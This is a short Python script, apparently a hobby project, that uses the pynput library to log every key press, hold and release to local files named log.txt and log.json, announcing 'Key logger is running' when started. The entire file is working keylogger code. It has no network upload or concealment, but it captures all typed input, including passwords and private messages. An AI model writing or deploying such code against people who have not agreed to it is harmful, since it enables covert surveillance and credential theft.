from pynput import keyboard
import json
key_list = []
x = False
k_s = ""

def utf(key):
    with open('log.txt', 'w+') as file:
        file.write(key)

def ujf(key_list):
    with open('log.json', 'w') as file:
        klb = json.dumps(key_list)
        file.write(klb)

print("Key logger is running")

def on_press(key):
    global x, key_list
    if not x:
        key_list.append({'Key Pressed is': f'{key}'})
        x = True
    elif x:
        key_list.append({'Held': f'{key}'})
    ujf(key_list)

def on_release(key):
    global x, key_list, k_s
    key_list.append({'Key Pressed is': f'{key}'})
    if x:
        x = False
    ujf(key_list)
    k_s = k_s + str(key)
    utf(str(k_s))

listener = keyboard.Listener(on_press=on_press, on_release=on_release)
listener.start()
listener.join()
